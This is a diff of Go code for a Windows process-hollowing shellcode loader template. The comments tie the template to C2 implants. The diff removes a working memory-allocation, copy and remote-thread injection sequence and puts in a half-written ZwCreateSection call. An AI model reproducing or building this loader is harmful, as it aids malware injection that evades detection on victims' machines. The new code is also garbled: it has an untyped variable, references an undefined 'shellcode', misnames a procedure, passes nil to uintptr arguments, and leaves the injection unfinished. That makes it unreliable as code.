@@ -15,7 +15,6 @@ func GetProcessHollowingTemplate(targetProcess string) string {
 
 import (
 	"os"
-    "fmt"
 	"syscall"
 	"unsafe"
 )
@@ -25,14 +24,18 @@ const (
 	MEM_RESERVE            = 0x2000
 	PAGE_EXECUTE_READWRITE = 0x40
 
-    CREATE_SUSPENDED = 0x00000004
-    DETACHED_PROCESS = 0x00000008
-    CREATE_NO_WINDOW = 0x08000000
+    SEC_COMMIT          = 0x08000000
+    SECTION_ALL_ACCESS  = 0x000F001F
+    CREATE_SUSPENDED    = 0x00000004
+    DETACHED_PROCESS    = 0x00000008
+    CREATE_NO_WINDOW    = 0x08000000
 )
 
 var (
 	kernel32 = syscall.MustLoadDLL("kernel32.dll")
 	ntdll    = syscall.MustLoadDLL("ntdll.dll")
+
+    zwCreateSection = ntdll.MustFindProc("ZwCreateSection")
 
 	virtualAlloc = kernel32.MustFindProc("VirtualAlloc")
 	rtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
@@ -70,45 +73,28 @@ func loadProcess(target string) *syscall.ProcessInformation {
 		panic(err)
 	}
 
-    fmt.Println("[+] Created process in suspended state")
+    println("[+] Created process in suspended state")
 
 	return &pi
 }
 
 func ExecuteOrderSixtySix(payload []byte) {
-
-	// Create the process
     process := loadProcess("%s")
 
-   	// Allocate memory for the payload in the target process
-	payloadAddr, _, _ := virtualAlloc.Call(
-		0, uintptr(len(payload)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE,
-	); if payloadAddr == 0 {
-        os.Exit(1)
-	}
 
-    fmt.Printf("[+] Payload addr: %%#lx \n", payloadAddr)
+    var hShellcode
+    sectionSize := int64(len(shellcode))
+    _, _, _ = ZwCreateSection.Call(
+        uintptr(unsafe.Pointer(&hShellcode)),
+        SECTION_ALL_ACCESS,
+        nil,
+        uintptr(unsafe.Pointer(sectionSize)),
+        PAGE_EXECUTE_READWRITE,
+        SEC_COMMIT,
+        nil,
+    )
 
-	// Copy the payload to the target process
-	_, _, _ = rtlCopyMemory.Call(
-		payloadAddr, (uintptr)(unsafe.Pointer(&payload[0])), uintptr(len(payload)),
-	)
 
-    fmt.Println("[+] rtlCopyMemory done")
-
-	// Create a remote thread to execute the payload
-	var threadID uint32
-	threadHandle, _, _ := createThread.Call(
-		0, 0, payloadAddr, 0, 0, uintptr(unsafe.Pointer(&threadID)),
-	); if threadHandle == 0 {
-        os.Exit(1)
-	}
-	defer syscall.CloseHandle(syscall.Handle(threadHandle))
-    fmt.Println("[+] createThread done")
-
-	// Resume the suspended main thread to allow the payload to execute
-	resumeThread.Call(uintptr(process.Thread))
-    fmt.Println("[+] resumeThread done")
 
     /* block, so that process does not die (useful for C2 implants) */
     select {}
